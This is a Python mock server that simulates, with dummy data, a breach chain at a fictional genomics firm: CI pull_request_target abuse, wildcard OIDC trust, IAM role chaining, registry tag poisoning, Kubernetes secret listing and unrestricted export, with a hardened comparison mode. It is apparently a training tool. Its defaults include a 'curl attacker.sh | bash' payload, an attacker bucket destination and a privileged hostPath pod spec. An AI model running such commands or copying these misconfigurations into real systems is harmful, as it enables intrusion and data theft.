#!/usr/bin/env python3
"""
Helix Diagnostics — Minimal Mock Prototype Server
==================================================
A tiny, dependency-free (stdlib only) mock of the real Helix estate.

It models the REAL flow with DUMMY data:
  GitHub PR (pull_request_target) -> OIDC -> HelixDeploy -> HelixPipelineOps
  -> Registry (mutable tag) -> K8s (helix-prod) -> HelixDataExport -> helix-sequences

Run:
  python3 app.py              # vulnerable mode (as breached)
  FIXED=true python3 app.py   # hardened mode (for comparison)

Then in another terminal:
  python3 attacker.py

All state is in-memory + ./data/*.json so you can inspect it.
"""
import json
import os
import re
import hashlib
import time
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

PORT = int(os.environ.get("PORT", "8471"))
FIXED = os.environ.get("FIXED", "").lower() in ("1", "true", "yes")

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

def now_iso():
    return datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

def log_audit(event, details):
    entry = {"ts": now_iso(), "event": event, "details": details}
    # append to file
    try:
        with open(os.path.join(DATA_DIR, "audit.log"), "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass
    print(f"[AUDIT] {event}: {json.dumps(details)[:300]}", flush=True)
    return entry

# ---------------------------------------------------------------- state
def dummy_genomes(n=300):
    """Generate n dummy genome records (we simulate 31k via counters, store 300 samples)."""
    import random
    random.seed(42)
    recs = []
    for i in range(1, n + 1):
        recs.append({
            "sample_id": f"HELIX-SMP-{i:06d}",
            "patient_ref": f"PT-{100000+i}",
            "hospital": f"hospital-group-{(i % 40)+1:02d}",
            "sequence_hash": hashlib.sha256(f"genome-{i}".encode()).hexdigest()[:16],
            "size_kb": 4200 + (i % 900),
        })
    return recs

STATE = {
    # --- GitHub ---
    "repo": {
        "name": "helix-diagnostics/helix-seqtools",
        "public": True,
        "external_prs_2026": 41,
        "workflow_trigger": "pull_request_target",  # VULN: runs with base secrets before review
        "runner": "self-hosted (helix-build account)",
        "branch_protection": "1 review required for MERGE only (not execution)",
    },
    "workflow_runs": [],
    # --- IAM ---
    "roles": {
        "HelixDeploy": {
            "account": "helix-build",
            # VULNERABLE trust: org-wide wildcard
            "trust_subject": "repo:helix-diagnostics/*" if not FIXED else "repo:helix-diagnostics/seq-pipeline:ref:refs/heads/main",
            "description": "production deployment role (federated OIDC)",
        },
        "HelixPipelineOps": {
            "account": "helix-build",
            "trust_principal": "HelixDeploy",
            "can_push_registry": True,
            "can_assume": ["HelixDataExport"],
        },
        "HelixDataExport": {
            "account": "helix-prod",
            "trust_principal": "HelixPipelineOps",
            "can_read_sequences": True,
            # VULN: no allow-list on destination
            "allowed_destinations": "*" if not FIXED else ["s3://hospital-deliveries/*"],
        },
    },
    "assumptions": [],   # cloud audit trail
    # --- Runner ---
    "runner": {
        "type": "self-hosted, long-lived VMs (x4)",
        "clean_between_runs": "working directory ONLY (/work)",
        "persists": "/opt/runner-env, /tmp, cron, processes",
        "implants": [],  # attacker persistence
    },
    # --- Registry ---
    "registry": {
        "path": "registry.helix.internal/seq-pipeline/base",
        "tags": {
            "stable": {
                "digest": "sha256:aaa111 (legit, pushed 02-Oct-2026)",
                "history": [
                    {"tag": "stable", "digest": "sha256:aaa111", "pushed_by": "HelixPipelineOps (CI, legit)", "ts": "2026-10-02T10:00:00Z"}
                ],
                "pulled_by": "pipeline job definitions (by TAG, not digest)" if not FIXED else "pipeline job definitions (by DIGEST, pinned)",
            }
        },
    },
    # --- K8s ---
    "k8s": {
        "cluster": "helix-prod",
        "default_automount": False if FIXED else True,  # VULN: every pod gets token
        "admission_controller": ("Kyverno (deny hostPath root + privileged combo)" if FIXED else None),
        "clusterroles": {
            "pipeline-reader": {
                "verbs": ["get", "list"],
                "resources": ["secrets", "configmaps", "pods"],
                "scope": "cluster-wide (*)",
                "created": "2023, observability trial (abandoned, never revoked)",
            }
        },
        "bindings": [
            # VULN: bound to every authenticated pod
            {"role": "pipeline-reader", "subject": "system:authenticated" if not FIXED else "system:serviceaccount:monitoring:otel-collector (removed 2026)"}
        ],
        "secrets": [
            {"namespace": "pipeline", "name": "db-creds", "value": "DUMMY-db-pass-****"},
            {"namespace": "pipeline", "name": "registry-creds", "value": "DUMMY-reg-token-****"},
            {"namespace": "kube-system", "name": "cloud-key", "value": "DUMMY-cloud-****"},
            {"namespace": "export", "name": "lis-api-key", "value": "DUMMY-lis-****"},
            {"namespace": "default", "name": "tls-cert", "value": "DUMMY-tls-****"},
        ],
        "pods": [
            {"name": "seq-pipeline-7d9f", "namespace": "pipeline", "sa": "pipeline-runner", "image": "stable", "privileged": False},
        ],
        "secret_access_count": 0,
    },
    # --- Data ---
    "sequences": dummy_genomes(300),
    "sequences_total_simulated": 31000,
    "sequences_read_counter": 0,
    "lis_deliveries": 4900,  # legitimate business events in window
    "exports": [],
    # --- SOC ---
    "alerts": [],
    "runbooks_cover": ["human sign-in anomaly", "long-lived key use", "identity-policy change", "logging disablement", "public storage exposure"],
    "soc_notes": [],
}

# seed files
with open(os.path.join(DATA_DIR, "sequences_sample.json"), "w") as f:
    json.dump(STATE["sequences"][:20], f, indent=2)

def oidc_matches_trust(token_sub, trust_pattern):
    """Simulate AWS-style wildcard matching: repo:helix-diagnostics/* """
    # convert glob to regex
    rx = "^" + re.escape(trust_pattern).replace(r"\*", ".*") + "$"
    return re.match(rx, token_sub) is not None

def mint_oidc(repo, pr_number=None):
    # pull_request_target resolves subject as repo:...:pull_request (per F4)
    sub = f"repo:{repo}:pull_request"
    token = f"oidc.{hashlib.sha256((sub+str(time.time())).encode()).hexdigest()[:24]}"
    return {"token": token, "sub": sub, "repo": repo, "pr": pr_number, "event": "pull_request_target"}

CRED_STORE = {}  # cred_id -> {role, issued_to, ts}

def issue_creds(role, issued_to):
    cid = f"cred-{hashlib.sha256((role+issued_to+str(time.time())).encode()).hexdigest()[:12]}"
    CRED_STORE[cid] = {"role": role, "issued_to": issued_to, "ts": now_iso()}
    return cid

# ---------------------------------------------------------------- http
class Handler(BaseHTTPRequestHandler):
    def _send(self, code, obj, ctype="application/json"):
        body = obj.encode() if isinstance(obj, str) else json.dumps(obj, indent=2).encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        p = urlparse(self.path)
        path = p.path
        qs = parse_qs(p.query)

        if path == "/":
            return self._send(200, DASHBOARD_HTML, "text/html")
        if path == "/health":
            return self._send(200, {"ok": True, "mode": "FIXED" if FIXED else "VULNERABLE", "ts": now_iso()})
        if path == "/api/state":
            # trimmed state for dashboard
            s = json.loads(json.dumps(STATE))
            s["sequences"] = f"<{len(s['sequences'])} sample records, {s['sequences_total_simulated']} simulated total>"
            s["mode"] = "FIXED" if FIXED else "VULNERABLE"
            return self._send(200, s)
        if path == "/api/roles":
            return self._send(200, STATE["roles"])
        if path == "/api/registry":
            return self._send(200, STATE["registry"])
        if path == "/api/k8s":
            return self._send(200, STATE["k8s"])
        if path == "/api/alerts":
            return self._send(200, STATE["alerts"])
        if path == "/api/stats":
            return self._send(200, {
                "sequences_read": STATE["sequences_read_counter"],
                "lis_deliveries": STATE["lis_deliveries"],
                "gap_unexplained_reads": STATE["sequences_read_counter"] - STATE["lis_deliveries"],
                "secret_access": STATE["k8s"]["secret_access_count"],
                "exports": STATE["exports"],
                "assumptions": STATE["assumptions"][-10:],
            })
        if path == "/api/audit":
            try:
                with open(os.path.join(DATA_DIR, "audit.log")) as f:
                    lines = f.read().strip().split("\n")[-50:]
                return self._send(200, {"audit_tail": [json.loads(l) for l in lines if l.strip()]})
            except FileNotFoundError:
                return self._send(200, {"audit_tail": []})
        return self._send(404, {"error": "unknown GET " + path})

    def do_POST(self):
        p = urlparse(self.path)
        path = p.path
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode() if length else "{}"
        try:
            body = json.loads(raw) if raw.strip() else {}
        except Exception:
            body = {}

        # ---- 1. GitHub PR -> workflow run (pull_request_target) ----
        if path == "/api/github/pr":
            author = body.get("author", "external-user")
            repo = body.get("repo", "helix-diagnostics/helix-seqtools")
            pr = len(STATE["workflow_runs"]) + 101
            oidc = mint_oidc(repo, pr)
            run = {
                "run_id": f"run-{pr}",
                "pr": pr, "author": author, "repo": repo,
                "event": "pull_request_target",
                "runs_before_review": True,
                "has_base_secrets": True,   # the core flaw
                "attacker_code_executed": body.get("payload", "curl attacker.sh | bash"),
                "oidc_sub": oidc["sub"],
                "ts": now_iso(),
            }
            STATE["workflow_runs"].append(run)
            log_audit("github.workflow_run", run)
            return self._send(200, {"workflow_run": run, "oidc": oidc,
                "note": "pull_request_target runs attacker code WITH base-repo secrets BEFORE review (F3). Branch protection only gates merge (F27)."})

        # ---- 2. Assume HelixDeploy via OIDC ----
        if path == "/api/iam/assume-deploy":
            sub = body.get("oidc_sub", "")
            trust = STATE["roles"]["HelixDeploy"]["trust_subject"]
            allowed = oidc_matches_trust(sub, trust)
            rec = {"role": "HelixDeploy", "oidc_sub": sub, "trust": trust, "allowed": allowed, "ts": now_iso()}
            STATE["assumptions"].append(rec)
            log_audit("iam.assume_HelixDeploy", rec)
            if not allowed:
                return self._send(403, {"allowed": False, "reason": f"sub {sub!r} does not match trust {trust!r}", "fix": "pin trust to exact repo/workflow/ref"})
            cid = issue_creds("HelixDeploy", sub)
            return self._send(200, {"allowed": True, "cred_id": cid, "role": "HelixDeploy",
                "why": f"wildcard trust {trust!r} accepted low-trust repo token (F5)"})

        # ---- 3. Runner exec (persistence demo) ----
        if path == "/api/runner/exec":
            cmd = body.get("cmd", "whoami")
            persist_path = body.get("persist_path", "")
            out = {"executed_on": "self-hosted runner vm-2 (helix-build)", "cmd": cmd, "ts": now_iso()}
            if persist_path and "/work" not in persist_path:
                STATE["runner"]["implants"].append({"path": persist_path, "cmd": cmd, "ts": now_iso()})
                out["persisted"] = True
                out["warning"] = f"{persist_path} is OUTSIDE /work -> survives job cleanup, infects future legitimate builds (F8)"
            else:
                out["persisted"] = False
            log_audit("runner.exec", out)
            return self._send(200, out)

        # ---- 4. Chain: HelixDeploy -> HelixPipelineOps ----
        if path == "/api/iam/assume-chain":
            cred = body.get("cred_id", "")
            target = body.get("target", "HelixPipelineOps")
            src = CRED_STORE.get(cred)
            if not src:
                return self._send(403, {"allowed": False, "reason": "unknown cred_id"})
            # trust check: target trusts source role?
            trusted_by = STATE["roles"].get(target, {}).get("trust_principal", "")
            allowed = (src["role"] == trusted_by)
            rec = {"from": src["role"], "to": target, "allowed": allowed, "ts": now_iso()}
            STATE["assumptions"].append(rec)
            log_audit("iam.chain", rec)
            if not allowed:
                return self._send(403, rec)
            cid = issue_creds(target, f"chained-from:{src['role']}")
            return self._send(200, {"allowed": True, "cred_id": cid, "role": target,
                "note": "Each hop approved separately; nobody ever traced HelixDeploy->...->HelixDataExport end-to-end (F25/F26)."})

        # ---- 5. Registry push (mutable tag) ----
        if path == "/api/registry/push":
            cred = body.get("cred_id", "")
            tag = body.get("tag", "stable")
            src = CRED_STORE.get(cred)
            if not src or not STATE["roles"].get(src["role"], {}).get("can_push_registry"):
                # HelixDeploy itself cannot push; must chain first (F10)
                log_audit("registry.push_denied", {"cred_role": src["role"] if src else None})
                return self._send(403, {"allowed": False, "reason": f"role {src['role'] if src else '?'} cannot push; chain to HelixPipelineOps first (F10)"})
            if FIXED:
                return self._send(403, {"allowed": False, "reason": "immutable tags enforced: 'stable' is frozen; pipelines pin by digest. Push rejected.",
                                        "fix": "cosign + digest pinning"})
            new_digest = "sha256:evil" + hashlib.sha256(str(time.time()).encode()).hexdigest()[:6]
            entry = {"tag": tag, "digest": new_digest, "pushed_by": f"{src['role']} (attacker-chained)", "ts": now_iso()}
            STATE["registry"]["tags"][tag]["digest"] = new_digest
            STATE["registry"]["tags"][tag]["history"].append(entry)
            log_audit("registry.push", entry)
            return self._send(200, {"allowed": True, "pushed": entry,
                "impact": "Every future pipeline pulling 'stable' by TAG now gets attacker image with zero config change (F9)."})

        # ---- 6. K8s: pipeline pod lists secrets (pipeline-reader) ----
        if path == "/api/k8s/list-secrets":
            sa = body.get("sa", "pipeline-runner")
            # every pod automounts -> member of system:authenticated -> bound to pipeline-reader
            member = STATE["k8s"]["default_automount"]
            binding = any(b["subject"] == "system:authenticated" for b in STATE["k8s"]["bindings"])
            allowed = member and binding
            STATE["k8s"]["secret_access_count"] += len(STATE["k8s"]["secrets"]) if allowed else 0
            log_audit("k8s.list_secrets", {"sa": sa, "allowed": allowed, "automount": member, "binding": binding})
            if not allowed:
                return self._send(403, {"allowed": False, "reason": "RBAC denies: binding removed / automount disabled (fixed)",
                                        "secret_access_count": STATE["k8s"]["secret_access_count"]})
            return self._send(200, {"allowed": True, "secrets": STATE["k8s"]["secrets"],
                "why": "pipeline-reader (get/list secrets cluster-wide) still bound to system:authenticated (F12) + every pod automounts token (F13).",
                "secret_access_count": STATE["k8s"]["secret_access_count"],
                "compare_real": "real incident: 14,000 get/list ops 15-22 Nov (F11)"})

        # ---- 7. K8s: create privileged + hostPath pod ----
        if path == "/api/k8s/create-pod":
            spec = body.get("spec", {"privileged": True, "hostPath": "/",
                                     "name": "seq-pipeline-debug"})
            wants_hostpath_root = spec.get("hostPath") == "/" and spec.get("privileged")
            if FIXED and wants_hostpath_root:
                log_audit("k8s.pod_denied", spec)
                return self._send(403, {"allowed": False,
                    "reason": "admission controller DENIED hostPath '/' + privileged (Kyverno policy).",
                    "fix": "deny hostPath root; allowlist device-plugin paths only"})
            pod = {"name": spec.get("name", "evil-pod"), "namespace": "pipeline",
                   "sa": "pipeline-runner", "image": STATE["registry"]["tags"]["stable"]["digest"],
                   "privileged": spec.get("privileged", False), "hostPath": spec.get("hostPath"),
                   "ts": now_iso()}
            STATE["k8s"]["pods"].append(pod)
            alert = {"id": f"ALT-{len(STATE['alerts'])+1:03d}", "type": "privileged-pod",
                     "detail": f"pod {pod['name']} requests hostPath '/' + privileged", "ts": now_iso(),
                     "status": "OPEN", "real_ref": "F20 fired 16 Nov 04:22; closed wrongly as expected (F21 base-rate failure)"}
            STATE["alerts"].append(alert)
            log_audit("k8s.create_pod", pod)
            return self._send(200, {"allowed": True, "pod": pod, "alert": alert,
                "impact": "No admission control (F14): container-to-node breakout. Attacker owns the node."})

        # ---- 8. Export: read sequences + deliver anywhere ----
        if path == "/api/export/read":
            cred = body.get("cred_id", "")
            count = int(body.get("count", 100))
            src = CRED_STORE.get(cred)
            if not src or not STATE["roles"].get(src["role"], {}).get("can_read_sequences"):
                return self._send(403, {"allowed": False, "reason": f"role {src['role'] if src else '?'} cannot read helix-sequences; chain to HelixDataExport first"})
            STATE["sequences_read_counter"] += count
            sample = STATE["sequences"][:5]
            over = STATE["sequences_read_counter"] > 6000
            alert = None
            if over and not any(a["type"] == "bulk-read" for a in STATE["alerts"]):
                alert = {"id": f"ALT-{len(STATE['alerts'])+1:03d}", "type": "bulk-read",
                         "detail": f"{STATE['sequences_read_counter']} reads vs ~2,400/mo baseline", "ts": now_iso(),
                         "status": "OPEN", "real_ref": "F22 fired 19 Nov 09:03; closed wrongly (no LIS access, F19)"}
                STATE["alerts"].append(alert)
            log_audit("export.read", {"by": src["role"], "count": count, "total": STATE["sequences_read_counter"]})
            return self._send(200, {"allowed": True, "read": count, "total_read": STATE["sequences_read_counter"],
                "sample": sample, "lis_deliveries": STATE["lis_deliveries"],
                "unexplained": STATE["sequences_read_counter"] - STATE["lis_deliveries"],
                "alert": alert, "compare_real": "real: 31,000 reads 19 Nov-6 Jan vs 4,900 LIS deliveries (F18/F19)"})

        if path == "/api/export/deliver":
            cred = body.get("cred_id", "")
            dest = body.get("destination", "s3://attacker-bucket/drop")
            count = int(body.get("count", 100))
            src = CRED_STORE.get(cred)
            if not src or src["role"] != "HelixDataExport":
                return self._send(403, {"allowed": False, "reason": "need HelixDataExport creds"})
            allowed_list = STATE["roles"]["HelixDataExport"]["allowed_destinations"]
            if FIXED:
                ok = any(dest.startswith(p.replace("*", "")) for p in allowed_list)
                if not ok:
                    log_audit("export.deliver_denied", {"dest": dest})
                    return self._send(403, {"allowed": False,
                        "reason": f"destination {dest!r} not in allow-list {allowed_list}",
                        "fix": "allow-list hospital-group buckets only; validate param server-side"})
            exp = {"destination": dest, "count": count, "by": src["role"], "ts": now_iso()}
            STATE["exports"].append(exp)
            log_audit("export.deliver", exp)
            return self._send(200, {"allowed": True, "exported": exp,
                "impact": "Write goes to ANY destination named in config param (F17) — the exfiltration valve."})

        # ---- 9. SOC triage (demonstrates misclassification) ----
        if path == "/api/soc/triage":
            aid = body.get("alert_id", "")
            verdict = body.get("verdict", "expected behaviour")
            for a in STATE["alerts"]:
                if a["id"] == aid:
                    a["status"] = "CLOSED: " + verdict
                    STATE["soc_notes"].append({"alert": aid, "verdict": verdict, "ts": now_iso()})
                    log_audit("soc.triage", {"alert": aid, "verdict": verdict})
                    return self._send(200, {"triaged": a,
                        "lesson": "Both real alerts fired on time and were closed wrong (F20/F22): base-rate + missing LIS cross-check."})
            return self._send(404, {"error": "alert not found"})

        if path == "/api/reset":
            STATE["sequences_read_counter"] = 0
            STATE["k8s"]["secret_access_count"] = 0
            STATE["exports"] = []
            STATE["alerts"] = []
            STATE["assumptions"] = []
            STATE["workflow_runs"] = []
            STATE["runner"]["implants"] = []
            STATE["registry"]["tags"]["stable"] = {
                "digest": "sha256:aaa111 (legit, pushed 02-Oct-2026)",
                "history": [{"tag": "stable", "digest": "sha256:aaa111", "pushed_by": "HelixPipelineOps (CI, legit)", "ts": "2026-10-02T10:00:00Z"}],
                "pulled_by": STATE["registry"]["tags"]["stable"]["pulled_by"],
            }
            CRED_STORE.clear()
            try:
                os.remove(os.path.join(DATA_DIR, "audit.log"))
            except Exception:
                pass
            log_audit("system.reset", {"mode": "FIXED" if FIXED else "VULNERABLE"})
            return self._send(200, {"ok": True})

        return self._send(404, {"error": "unknown POST " + path})

    def log_message(self, *a):
        pass  # quiet; we use AUDIT lines

DASHBOARD_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Helix Mock Prototype</title>
<style>
body{font-family:system-ui,Arial,sans-serif;background:#0b1020;color:#e8ecf4;margin:0;padding:24px}
.card{background:#151c33;border:1px solid #2a3560;border-radius:12px;padding:16px;margin:12px 0}
h1{margin:0 0 4px} .muted{color:#9aa4c0} code{background:#0e1430;padding:2px 6px;border-radius:6px}
a{color:#7cc7ff} .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.badge{display:inline-block;padding:2px 10px;border-radius:20px;font-size:12px;background:#7a1f1f}
pre{white-space:pre-wrap;background:#0e1430;padding:12px;border-radius:8px;max-height:320px;overflow:auto}
button{background:#2f6bff;color:#fff;border:0;padding:8px 14px;border-radius:8px;cursor:pointer}
</style></head><body>
<h1>🧬 Helix Diagnostics — Mock Prototype</h1>
<div class="muted">Vulnerable-mode twin of the breached estate. Dummy data, real flow. Drive it with <code>python3 attacker.py</code></div>
<div class="grid">
<div class="card"><h3>Architecture (simplified)</h3><pre>Attacker PR ─▶ GitHub pull_request_target (base secrets + attacker code)
        │  OIDC sub = repo:helix-diagnostics/helix-seqtools:pull_request
        ▼
HelixDeploy  ◀── trust: repo:helix-diagnostics/*  (WILDCARD — vuln)
        │ chain
        ▼
HelixPipelineOps ──push──▶ Registry tag 'stable' (MUTABLE — vuln)
        │ chain                    │ pulled by tag
        ▼                          ▼
HelixDataExport ◀── K8s helix-prod: pipeline-reader → system:authenticated (vuln)
        │ read helix-sequences + write ANYWHERE (vuln)
        ▼
Attacker bucket ─▶ public research repo (11 Jan)</pre>
<div class="muted">SOC sees cloud+storage only. K8s audit → platform team only. No runtime telemetry. Runbooks miss this whole class.</div></div>
<div class="card"><h3>Live state</h3><div id="s" class="muted">loading…</div>
<p><button onclick="load()">Refresh</button> <button onclick="reset()">Reset demo</button></p></div>
</div>
<div class="card"><h3>Audit tail</h3><pre id="a">loading…</pre></div>
<script>
async function load(){let s=await (await fetch('/api/state')).json();
document.getElementById('s').innerHTML='<pre>'+JSON.stringify({mode:s.mode,workflow_runs:s.workflow_runs.length,assumptions:s.assumptions.slice(-4),registry_tag:s.registry.tags.stable.digest,secret_access:s.k8s.secret_access_count,reads:s.sequences_read_counter,exports:s.exports,alerts:s.alerts},null,2)+'</pre>';
let a=await (await fetch('/api/audit')).json();
document.getElementById('a').textContent=JSON.stringify(a.audit_tail.slice(-12),null,2);}
async function reset(){await fetch('/api/reset',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});load();}
load();setInterval(load,4000);
</script></body></html>"""

if __name__ == "__main__":
    # fresh audit file header
    with open(os.path.join(DATA_DIR, "audit.log"), "a") as f:
        f.write(json.dumps({"ts": now_iso(), "event": "system.boot", "details": {"mode": "FIXED" if FIXED else "VULNERABLE", "port": PORT}}) + "\n")
    print("=" * 70)
    print(f" Helix mock prototype on http://0.0.0.0:{PORT}  mode={'FIXED' if FIXED else 'VULNERABLE'}")
    print("=" * 70)
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
